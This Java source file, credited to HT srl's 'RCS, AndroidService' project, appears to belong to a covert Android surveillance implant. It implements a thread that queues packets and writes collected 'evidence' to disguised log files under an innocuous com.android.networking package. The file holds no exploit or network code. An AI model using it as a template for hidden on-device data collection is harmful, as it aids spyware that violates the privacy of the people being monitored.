/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : LogDispatcher.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking;

import java.io.File;
import java.util.HashMap;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import com.android.networking.auto.Cfg;
import com.android.networking.evidence.Evidence;
import com.android.networking.file.Path;
import com.android.networking.util.Check;

/**
 * The Class EvDispatcher collects LogR messages and manages the evidence
 * creation, write and close.
 */
public class EvDispatcher extends Thread implements Runnable {
	private static final String TAG = "EvDispatcher"; //$NON-NLS-1$

	/** The singleton. */
	private volatile static EvDispatcher singleton;

	/** The q. */
	private final BlockingQueue<Packet> queue;

	/** The log map. */
	private final HashMap<Long, Evidence> evidences;

	/** The halt. */
	private boolean halt;

	/** The sd dir. */
	private File sdDir;

	/** The lock. */
	final Lock lock = new ReentrantLock();

	/** The no logs. */
	final Condition noLogs = lock.newCondition();

	private Object emptyQueue = new Object();

	/*
	 * private BroadcastReceiver mExternalStorageReceiver; private boolean
	 * mExternalStorageAvailable = false; private boolean
	 * mExternalStorageWriteable = false;
	 */

	/**
	 * Instantiates a new log dispatcher.
	 */
	private EvDispatcher() {
		halt = false;

		queue = new LinkedBlockingQueue<Packet>();
		evidences = new HashMap<Long, Evidence>();
		
		if (Cfg.DEBUG) {
			setName(getClass().getSimpleName());
		}
	}

	// Log name: QZM + 1 byte + 8 bytes + 4 bytes
	// QZA -> Signature
	// 1 byte -> Priority: 1 max - 255 min
	// 8 bytes -> Timestamp
	// 4 bytes -> .tmp while writing, .log when ready
	//
	// Markup name: QZM + 4 byte + 4 byte
	// QZM -> Signature
	// 4 bytes -> Log Type
	// 4 bytes -> .mrk
	/**
	 * Process queue.
	 */
	private void processQueue() {
		Packet p;

		if (queue.size() == 0) {
			return;
		}

		try {
			p = queue.take();
		} catch (final InterruptedException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
			return;
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (processQueue): " + p.getCommand());
		}
		switch (p.getCommand()) {

		case LogR.LOG_CREATE:
			createEv(p);
			break;

		case LogR.LOG_ATOMIC:
			atomicEv(p);
			break;

		case LogR.LOG_WRITE:
			writeEv(p);
			break;

		case LogR.LOG_CLOSE:
			closeEv(p);
			break;

		default:
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + "processQueue() got LOG_UNKNOWN"); //$NON-NLS-1$ //$NON-NLS-2$
			}
			break;
		}

		return;
	}

	/**
	 * Self.
	 * 
	 * @return the log dispatcher
	 */
	public static EvDispatcher self() {
		if (singleton == null) {
			synchronized (EvDispatcher.class) {
				if (singleton == null) {
					singleton = new EvDispatcher();
				}
			}
		}

		return singleton;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Thread#run()
	 */
	@Override
	public void run() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " LogDispatcher started"); //$NON-NLS-1$
		}

		// Create log directory
		sdDir = new File(Path.logs());
		sdDir.mkdirs();

		// Debug - used to remove the directory
		// sdDir();

		while (true) {
			lock.lock();

			try {
				while (queue.isEmpty() && !halt) {
					synchronized (emptyQueue) {
						emptyQueue.notifyAll();
					}
					noLogs.await();
				}

				// Halt command has precedence over queue processing
				if (halt == true) {
					queue.clear();
					evidences.clear();

					if (Cfg.DEBUG) {
						Check.log(TAG + " LogDispatcher closing"); //$NON-NLS-1$
					}

					return;
				}

				processQueue();
			} catch (final Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			} finally {
				lock.unlock();
			}
		}
	}

	/**
	 * Send.
	 * 
	 * @param packet
	 *            the packet
	 * @return true, if successful
	 */
	public synchronized boolean send(final Packet packet) {
		lock.lock();
		boolean added = false;

		try {
			added = queue.add(packet);

			if (added) {
				noLogs.signal();
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		} finally {
			lock.unlock();
		}

		return added;
	}

	/**
	 * Halt.
	 */
	public synchronized void halt() {
		lock.lock();

		try {
			halt = true;
			noLogs.signal();
		} finally {
			lock.unlock();
		}
	}

	/**
	 * Creates the log.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean createEv(final Packet p) {
		if (Cfg.DEBUG) {
			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
		}

		final byte[] additional = p.getAdditional();
		final Evidence evidence = new Evidence(p.getType());

		if (evidence.createEvidence(additional)) {
			evidences.put(p.getId(), evidence);
		}

		return true;
	}

	/**
	 * Creates a simple log, copies the payload and closes it in one atomic
	 * step.
	 * 
	 * @param p
	 *            the p
	 */
	private void atomicEv(final Packet p) {
		if (Cfg.DEBUG) {
			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
		}

		final byte[] additional = p.getAdditional();
		final byte[] data = p.peek();
		final Evidence evidence = new Evidence(p.getType());

		evidence.createEvidence(additional);
		evidence.writeEvidence(data);
		evidence.close();
	}

	/**
	 * Write log.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean writeEv(final Packet p) {
		if (evidences.containsKey(p.getId()) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Requested log not found"); //$NON-NLS-1$
			}

			return false;
		}

		final Evidence evidence = evidences.get(p.getId());
		final boolean ret = evidence.writeEvidence(p.peek());

		return ret;
	}

	/**
	 * Close log.
	 * 
	 * @param p
	 *            the p
	 * @return true, if successful
	 */
	private boolean closeEv(final Packet p) {
		if (evidences.containsKey(p.getId()) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Requested log not found"); //$NON-NLS-1$
			}
			return false;
		}

		// Rename .tmp to .log
		final Evidence evidence = evidences.get(p.getId());

		if (evidence != null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (closeLog): " + evidence);
			}

			evidence.close();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " ERROR (closeLog): evidence==null");
			}
		}

		return true;
	}

	/**
	 * da chiamare solo dopo aver chiamato la AgentManager.stopAll()
	 */
	public void waitOnEmptyQueue() {
		try {
			synchronized (emptyQueue) {
				if (queue.isEmpty()) {
					return;
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (waitOnEmptyQueue)");
				}
				emptyQueue.wait();
			}
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(ex);
			}
		}
	}
}
